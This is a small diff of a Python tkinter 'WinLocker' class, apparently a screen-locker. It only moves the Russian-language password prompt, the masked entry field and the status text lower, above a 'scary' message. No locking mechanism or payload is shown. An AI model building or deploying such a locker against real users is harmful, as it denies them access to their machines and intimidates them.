@@ -83,11 +83,11 @@ class WinLocker:
         )
         self.canvas.create_text(50, 550, text=scary_text, fill='white', font=('Courier', 14), anchor='sw')
         
-        # Поле ввода по центру
-        self.canvas.create_text(400, 250, text="ВВЕДИТЕ ПАРОЛЬ:", fill='white', font=('Courier', 28))
+        # Поле ввода внизу, прямо над страшным текстом
+        self.canvas.create_text(400, 480, text="ВВЕДИТЕ ПАРОЛЬ:", fill='white', font=('Courier', 28))
         self.entry = tk.Entry(self.win, show="*", font=('Courier', 28), bg='black', fg='white', insertbackground='white')
-        self.canvas.create_window(400, 310, window=self.entry)
-        self.status = self.canvas.create_text(400, 370, text="", fill='white', font=('Courier', 20))
+        self.canvas.create_window(400, 520, window=self.entry)
+        self.status = self.canvas.create_text(400, 570, text="", fill='white', font=('Courier', 20))
         
         self.entry.bind('<Return>', self.check_password)
         self.entry.focus_set()
